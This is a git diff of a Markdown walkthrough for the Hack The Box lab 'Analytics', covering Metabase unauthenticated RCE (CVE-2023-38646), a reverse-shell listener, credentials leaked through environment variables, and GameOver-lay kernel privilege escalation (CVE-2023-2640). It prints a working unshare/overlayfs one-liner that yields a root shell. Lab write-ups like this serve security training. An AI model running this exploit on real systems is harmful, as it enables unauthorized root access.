@@ -7,12 +7,13 @@ categories:
   - Linux
   - Easy 
 tags:
-  - metabase
+  - Metabase
   - CVE-2023-38646
-  - api
+  - API
   - UnAuthenticated RCE
-  - base64
-  - gameOver-lay
+  - Base64
+  - GameOver-lay
+  - Kernel exploits 
   - CVE-2023-2640
 
 
@@ -58,7 +59,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 The scan reveal *2 open ports* (22 & 80) and we can see its redirecting to the domain *analytical.htb*. Adding analytical.htb to /etc/hosts allowed us to access the web service; after investigating the web page we can find a subdomain, data.analytical.htb, hosting a **Metabase** login page.
 
-![Alt Text](/assets/images/HTB/Analytics/analytics1.png)
+![Alt Text](/assets/images/HTB/Analytics/Analytics1.png)
 
 # FoorHold.
 
@@ -69,7 +70,7 @@ I looked only for "metabase Vulnerabilities" and I am able to find an unauthenti
 
 If we go to http://data.analytical.htb/api/session/properties we will be able to see some "restictied/privileged" information the API is providing us due to **insufficient validation and accass control** on metabase.
 
-![Alt Text](/assets/images/HTB/Analytics/analytics2.png)
+![Alt Text](/assets/images/HTB/Analytics/Analytics2.png)
 
 - **setup-token** :249fa03d-fd94-4d5b-b94f-b4ebf3df681f
 
@@ -149,42 +150,59 @@ Content-Length: 822
 }
 ```
 
-![Alt Text](/assets/images/HTB/Analytics/analytics3.png)
+![Alt Text](/assets/images/HTB/Analytics/Analytics3.png)
 
 
 Before sending the Burp request (payload), we set up a listener on port 443 to capture the reverse shell.
 
-![Alt Text](/assets/images/HTB/Analytics/analytics4.png)
+![Alt Text](/assets/images/HTB/Analytics/Analytics5.png)
 
 # Privilege escalation - Root.
 
-Credential Discovery
-Inspecting the environment variables revealed application credentials:
+Something that i usually do when i get to a new system is to check the *enviroment variables* some times we can find useful information in there.
+
+```bash
+env
+```
+
+![Alt Text](/assets/images/HTB/Analytics/Analytics6.png)
+
+Inspecting the environment variables revealed application(metabase) credentials:
 •	User: metalytics
 •	Password: An4lytics_ds20223#
+
 Using these credentials, we accessed the system via SSH to gain a more stable foothold:
 bash
-Copy code
+```bash
 ssh metalytics@10.10.11.233
-Kernel Exploit for Privilege Escalation
-The target machine was running Ubuntu 22.04.2. A quick search revealed a privilege escalation vulnerability (CVE-2023-2640) in the kernel. We used an available exploit from GitHub:
-Exploit Link
-Exploit Execution
-The exploit involved leveraging unshare to execute a privileged shell. The command used:
-bash
-Copy code
+```
+
+## Kernel Exploit for Privilege Escalation
+### Finding kernel version
+The target machine was running **Ubuntu 22.04.2**. A quick search revealed a privilege escalation vulnerability (CVE-2023-2640) in the kernel. This can be found either by using similar tools to linpeas.sh or using linux commands:
+
+```bash
+uname -a
+```
+![Alt Text](/assets/images/HTB/Analytics/Analytics7.png)
+
+After trying out multiple exploits I was able to find a [working exploit.](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
+
+### Running exploit
+The exploit involved leveraging unshare to execute a privileged shell. 
+```bash
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
-After running the exploit, we gained root access to the system:
-bash
-Copy code
+```
+
+![Alt Text](/assets/images/HTB/Analytics/analytics8.png)
+
+After running the executable created, we gained root access to the system:
+```bash
 whoami
-# Output: root
-________________________________________
-Flags
-•	User Flag: 7ad28e32d94dc550ff845e7ee140d3ba
-•	Root Flag: 6da3f56123ab884d3b997f402709236b
-________________________________________
-Takeaways:
+```
+![Alt Text](/assets/images/HTB/Analytics/analytics9.png)
+
+# Takeaways:
 •	Always start with thorough enumeration, as it uncovers critical entry points like subdomains or API endpoints.
 •	CVE research and public write-ups are invaluable for learning manual exploitation techniques.
 •	Kernel privilege escalation remains a go-to technique when user-level access is obtained.
